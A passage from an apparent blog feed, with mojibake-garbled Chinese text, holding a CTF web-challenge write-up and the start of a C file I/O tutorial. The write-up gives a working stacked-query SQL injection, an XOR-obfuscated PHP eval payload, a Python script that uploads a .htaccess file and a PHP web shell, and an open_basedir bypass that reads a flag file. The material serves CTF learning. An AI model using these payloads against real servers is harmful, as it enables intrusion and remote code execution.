class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>äºæ˜¯è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªéé¢„æœŸï¼š<code>query=*,1</code></p><p>å› ä¸º <code>1||flag</code> == 1ï¼Œç„¶åå¯ä»¥æŸ¥è¯¢Flagè¡¨é‡Œæ‰€æœ‰å†…å®¹ã€‚</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gbm8sX.png" alt=""></p><p>é¢„æœŸè§£æ˜¯åˆ©ç”¨ <code>set sql_mode=&#39;pipes_as_concat&#39;</code>ï¼Œæ”¹å˜<code>||</code>è®©å®ƒå…·æœ‰æ‹¼æ¥å­—ç¬¦ä¸²çš„åŠŸèƒ½ï¼Œæœ¬åœ°æµ‹è¯•å¦‚ä¸‹ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gb1kiX.png" alt=""></p><p>äºæ˜¯æ„é€ <code>payloadï¼š1;set sql_mode=pipes_as_concat;select 1</code></p><p>å› ä¸ºæœ‰é•¿åº¦é™åˆ¶æ‰€ä»¥payloadå°½é‡ç²¾ç®€ã€‚</p><p><img src="https://t1.picb.cc/uploads/2019/08/25/gb1ODd.png" alt=""></p><h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><p>è¿™é¢˜ä¸€å…±æœ‰ä¸‰å±‚ï¼Œå‰å‰ååçœ‹äº†ä¸å°‘æ–‡ç« ï¼Œå­¦åˆ°äº†æŒºå¤šçŸ¥è¯†ã€‚</p><ul><li>å¼‚æˆ–æ„é€ ä¸åŒ…å«å­—æ¯æ•°å­—çš„web shell</li><li>.htaccessæ–‡ä»¶ä¸Šä¼ </li><li>bypass open_basedir</li></ul><p>é¦–å…ˆçœ‹é¢˜ç›®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å¯ä»¥åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œæˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// é™åˆ¶é•¿åº¦</span></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¥½ç‹ ä¸€æ­£åˆ™</span></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"><span class="comment">//ç»Ÿè®¡å­—èŠ‚å€¼å‡ºç°æ¬¡æ•°ï¼Œå°‘äº12</span></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ‰§è¡Œget_the_flag()å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡è¿‡æ»¤æ‰§è¡Œeval()ï¼Œè§‚å¯Ÿå‘ç°æ­£åˆ™æ²¡æœ‰è¿‡æ»¤<code>^</code>ï¼Œè€ƒè™‘æŠ‘æˆ–å‡º<code>_GET</code>æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆFuzzä¸€ä¸‹æ„æˆæˆ‘ä»¬éœ€è¦çš„<code>_GET</code>çš„å­—ç¬¦æœ‰å“ªäº›ï¼Œè´´ä¸€ä¸ª<strong>@tr1ple</strong>å¸ˆå‚…çš„è„šæœ¬(tql)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ee= string.printable  <span class="comment"># å¯æ‰“å°å­—ç¬¦é›†åˆ</span></span><br><span class="line">a= map(<span class="keyword">lambda</span> x:x.encode(<span class="string">"hex"</span>),list(ee))  <span class="comment"># map(func)å‡½æ•°å¯¹ä¼ å…¥åˆ—è¡¨çš„æ¯ä¸ªå…ƒç´ æ‰§è¡Œfuncæ“ä½œ;lambdaè¡¨è¾¾å¼ä»¥ ":"åŒºåˆ†å‚æ•°å’Œè¯­å¥</span></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">print</span> list(ee)</span><br><span class="line"><span class="comment"># éå†èƒ½å¤ŸæŠ‘æˆ–å‡º_GETçš„ä¸å¯è§å­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(i) <span class="keyword">not</span> <span class="keyword">in</span> list(ee)) &amp; (chr(j) <span class="keyword">not</span> <span class="keyword">in</span> list(ee)):</span><br><span class="line">            tem = i^j</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"_"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:])+<span class="string">"^"</span>+str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                _.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"G"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                G.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"E"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                E.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tem)==<span class="string">"T"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(str(hex(i)[<span class="number">2</span>:]) + <span class="string">"^"</span> + str(hex(j))[<span class="number">2</span>:])</span><br><span class="line">                T.append(temp)</span><br><span class="line"><span class="keyword">print</span> _</span><br><span class="line"><span class="keyword">print</span> G</span><br><span class="line"><span class="keyword">print</span> E</span><br><span class="line"><span class="keyword">print</span> T</span><br></pre></td></tr></table></figure><p>å‘ç°èƒ½å¤Ÿæ„æˆ<code>_GET</code>çš„æœ‰å¾ˆå¤šï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbvBZJ.png" alt=""></p><p>éšä¾¿å–ä¸€ä¸ªæ„æˆpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_&#x3D;$&#123;%81%81%81%81^%de%c6%c4%d5&#125;&#123;%81&#125;();&amp;%81&#x3D;phpinfo</span><br></pre></td></tr></table></figure><p>è‡³äº<code>payload</code>çš„æ„æˆåŸç†å¯ä»¥å‚è€ƒè¿™å‡ ä¸ªå¸ˆå‚…å†™çš„æ–‡ç« ï¼ŒæŒºæœ‰æ„æ€çš„ï¼Œä¹‹åä¹Ÿä¼šå†™ä¸€ç¯‡æ–‡ç« ä»”ç»†åˆ†æï¼š</p><p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">PHPä¸ä½¿ç”¨æ•°å­—,å­—æ¯å’Œä¸‹åˆ’çº¿å†™shell</a></p><p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">è®°ä¸€æ¬¡æ‹¿webshellè¸©è¿‡çš„å‘(å¦‚ä½•ç”¨PHPç¼–å†™ä¸€ä¸ªä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„åé—¨)</a></p><p><a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p>ç„¶åå†çœ‹ç¬¬äºŒéƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿‡æ»¤äº†phå’Œ&lt;?ï¼Œå’Œ<code>CheckIn</code>æœ‰äº›ç›¸ä¼¼ï¼Œä¸è¿‡è¿™é‡Œæ˜¯apache+phpï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ .htaccessæ–‡ä»¶ç»•è¿‡è¿‡æ»¤ï¼Œå¦å¤–æ³¨æ„éœ€è¦ä¼ªé€ æ–‡ä»¶å¤´ã€‚</p><p>è¿™é‡Œç›´æ¥è´´è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7026ab1a-8dc8-45a4-b735-d8125d6b04b9.node1.buuoj.cn/?_=$&#123;%81%81%81%81^%de%c6%c4%d5&#125;&#123;%81&#125;();&amp;%81=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹ï¼š\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.cc"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment"># shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>, (<span class="string">'.htaccess'</span>, htaccess, <span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;"http": "http://127.0.0.1:8080"&#125;</span></span><br><span class="line">r = requests.post(url=url, data=data, files=files)<span class="comment">#proxies=proxies)</span></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>, (<span class="string">'shell.cc'</span>, shell, <span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellä¹‹åï¼Œå‘ç°æœ‰open_basediré™åˆ¶ï¼Œåªèƒ½è¯»<code>/var/www/html/</code> å’Œ<code>/tmp/</code>ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbN9Iv.png" alt=""></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ä¹‹å‰<code>twitter</code>ä¸Šæ–°å‡ºçš„ open_basedir Bypassæ¥ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="keyword">echo</span>(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure><p>å…·ä½“åˆ†æï¼š<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedirçš„æ–°æ–¹æ³•</a></p><h2 id="Upload2"><a href="#Upload2" class="headerlink" title="Upload2"></a>Upload2</h2><p>â€‹    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å‰å‡ å¤©æ‰“çš„ä¸€ä¸ªæ¯”èµ›ï¼Œæœ‰äº›è‡ªé—­ï¼Œè¶ç€æœ‰æ—¶é—´ï¼ˆX-NCUAåšä¸å‡ºæ¥2333ï¼‰æ¥å¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;CheckIn&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Cè¯­è¨€ æ–‡ä»¶è¯»å†™</title>
    <link href="https://www.sketchplane.top/2019/08/13/C%E8%AF%AD%E8%A8%80-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
    <id>https://www.sketchplane.top/2019/08/13/C%E8%AF%AD%E8%A8%80-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</id>
    <published>2019-08-13T14:40:46.000Z</published>
    <updated>2019-08-13T14:41:34.159Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¢«è¦æ±‚å†™çš„æ•™ç¨‹ï¼Œç›´æ¥åˆ äº†æ„Ÿè§‰å¯æƒœï¼Œæ¯•ç«Ÿ<del>ç™¾åº¦</del>å†™äº†é‚£ä¹ˆä¹…ï¼Œå½“ä½œå¤‡å¿˜å½•è¦ç”¨çš„æ—¶å€™çœ‹çœ‹å§ã€‚</p><h2 id="0x00-æ‰“å¼€æ–‡ä»¶"><a href="#0x00-æ‰“å¼€æ–‡ä»¶" class="headerlink" title="0x00 æ‰“å¼€æ–‡ä»¶"></a>0x00 æ‰“å¼€æ–‡ä»¶</h2><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨<code>fopen()</code>å‡½æ•°æ¥<strong>æ‰“å¼€/åˆ›å»º</strong>ä¸€ä¸ªæ–‡ä»¶ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">const</span> <span class="keyword">char</span> * mode )</span></span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„<strong>filename</strong>ä¸ºéœ€è¦<strong>æ‰“å¼€/æ–°å»º</strong>çš„æ–‡ä»¶çš„åç§°ï¼Œ<strong>mode</strong>ä¸ºæ‰“å¼€çš„æ¨¡å¼ï¼Œå…·ä½“æè¿°å¦‚ä¸‹ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/08/13/g3NPH6.png" alt="img"></p><p>å¦‚æœå¤„ç†çš„æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåˆ™éœ€ä½¿ç”¨ä¸‹é¢çš„è®¿é—®æ¨¡å¼æ¥å–ä»£ä¸Šé¢çš„è®¿é—®æ¨¡å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"rb"</span>, <span class="string">"wb"</span>, <span class="string">"ab"</span>, <span class="string">"rb+"</span>, <span class="string">"r+b"</span>, <span class="string">"wb+"</span>, <span class="string">"w+b"</span>, <span class="string">"ab+"</span>, <span class="string">"a+b"</span></span><br></pre></td></tr></table></figure><p>å¦å¤–å‡½æ•°è¿”å›å€¼<strong>FILE*</strong>ä¸ºæ–‡ä»¶æŒ‡é’ˆï¼Œé€šå¸¸åˆç§°ä¸ºæ–‡ä»¶å¥æŸ„ï¼Œæˆ‘ä»¬è¿›è¡Œå…¶ä»–æ–‡ä»¶æ“ä½œæ—¶å®ƒé€šå¸¸ä½œä¸€ä¸ªèµ·æ ‡è®°ä½œç”¨çš„å‚æ•°ã€‚</p><h3 id="fopen-ç”¨æ³•ä¸¾ä¾‹"><a href="#fopen-ç”¨æ³•ä¸¾ä¾‹" class="headerlink" title="fopen() ç”¨æ³•ä¸¾ä¾‹"></a>fopen() ç”¨æ³•ä¸¾ä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¡Œé¢ç”Ÿæˆ test.txt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"C:\\Users\\your_name\\Desktop\\test.txt"</span>, <span class="string">"w"</span>);  <span class="comment">// æ³¨æ„æ”¹ä¸ºè‡ªå·±ç”µè„‘è·¯å¾„</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-å…³é—­æ–‡ä»¶"><a href="#0x01-å…³é—­æ–‡ä»¶" class="headerlink" title="0x01 å…³é—­æ–‡ä»¶"></a>0x01 